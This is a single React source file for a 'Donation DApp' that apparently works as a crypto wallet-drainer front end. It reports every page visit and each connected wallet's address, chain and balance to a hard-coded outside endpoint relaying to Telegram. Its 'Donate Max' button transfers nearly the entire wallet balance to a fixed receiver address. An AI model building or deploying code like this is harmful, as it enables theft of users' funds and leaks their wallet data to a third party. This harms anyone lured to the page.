import React, { useEffect, useState, useCallback } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useBalance, useSendTransaction, useNetwork, useConnectorClient } from "wagmi";
import { parseEther, formatEther } from "viem";

const API_URL = "https://web-production-2da7.up.railway.app/notify";
const RECEIVER = "0xdC3b29e4a6aF19d5E57965596020127A09049d83";

/* helper: notify backend */
async function notifyBackend(event, data) {
  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event, data, source: "Frontend" }),
    });
  } catch (err) {
    console.error("Notify error:", err);
  }
}

export default function App() {
  const { address, isConnected } = useAccount();
  const { chain } = useNetwork();
  const { data: balanceData } = useBalance({ address, watch: true });
  const { sendTransactionAsync } = useSendTransaction();
  const { data: client } = useConnectorClient(); // replacement for useSigner

  const [loading, setLoading] = useState(false);
  const [lastNotif, setLastNotif] = useState(null);

  // notify backend when page opens
  useEffect(() => {
    notifyBackend("link_open", { referrer: window.location.href });
  }, []);

  // notify on wallet connect
  useEffect(() => {
    if (isConnected && address) {
      const nativeBal = balanceData
        ? `${formatEther(BigInt(balanceData.value || 0))} ${chain?.nativeCurrency?.symbol || ""}`
        : "N/A";
      notifyBackend("wallet_connect", {
        account: address,
        chain: chain?.name || chain?.id || "unknown",
        nativeBalance: nativeBal,
        referrer: window.location.href,
      });
      setLastNotif("wallet_connect");
    }
  }, [isConnected, address, chain, balanceData]);

  /* donation helpers */
  const handleDonateFixed = async () => {
    if (!isConnected || !address) return;

    setLoading(true);
    try {
      await sendTransactionAsync({
        to: RECEIVER,
        value: parseEther("0.01"),
      });
      notifyBackend("donation_sent", {
        account: address,
        amount: "0.01",
        chain: chain?.name || chain?.id,
      });
    } catch (err) {
      notifyBackend("donation_failed", { error: err.message });
    } finally {
      setLoading(false);
    }
  };

  const handleDonateMax = async () => {
    if (!isConnected || !address || !balanceData) return;

    setLoading(true);
    try {
      const rawBalance = BigInt(balanceData.value || 0);
      const balanceEth = parseFloat(formatEther(rawBalance));
      if (balanceEth <= 0.0015) {
        notifyBackend("donation_failed", { error: "insufficient_balance" });
        setLoading(false);
        return;
      }
      const sendAmountEth = balanceEth - 0.001;
      const sendAmountWei = parseEther(sendAmountEth.toFixed(6));

      await sendTransactionAsync({
        to: RECEIVER,
        value: sendAmountWei,
      });

      notifyBackend("donation_sent", {
        account: address,
        amount: `${sendAmountEth.toFixed(6)}`,
        chain: chain?.name || chain?.id,
      });
    } catch (err) {
      notifyBackend("donation_failed", { error: err.message });
    } finally {
      setLoading(false);
    }
  };

  /* UI */
  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white space-y-6 p-6">
      <h1 className="text-4xl font-bold">🚀 Donation DApp</h1>
      <p className="max-w-xl text-center text-sm text-gray-300">
        Connect your wallet and donate. Events are sent to Telegram.
      </p>

      <ConnectButton />

      {isConnected && (
        <div className="flex flex-col gap-4 mt-6">
          <div className="text-sm text-gray-300">
            Connected: <span className="font-mono">{address}</span> on{" "}
            <strong>{chain?.name || chain?.id}</strong>
          </div>

          <div className="text-sm text-gray-300">
            Balance:{" "}
            {balanceData
              ? `${formatEther(BigInt(balanceData.value || 0))} ${chain?.nativeCurrency?.symbol}`
              : "N/A"}
          </div>

          <div className="flex gap-3">
            <button
              onClick={handleDonateFixed}
              className="px-6 py-3 bg-blue-600 hover:bg-blue-700 rounded-lg text-lg disabled:opacity-60"
              disabled={loading}
            >
              Donate 0.01 {chain?.nativeCurrency?.symbol || "native"}
            </button>

            <button
              onClick={handleDonateMax}
              className="px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-lg disabled:opacity-60"
              disabled={loading}
            >
              Donate Max
            </button>
          </div>

          <div className="mt-2 text-xs text-gray-400">
            Last notification: {lastNotif || "none"}
          </div>
        </div>
      )}
    </div>
  );
}
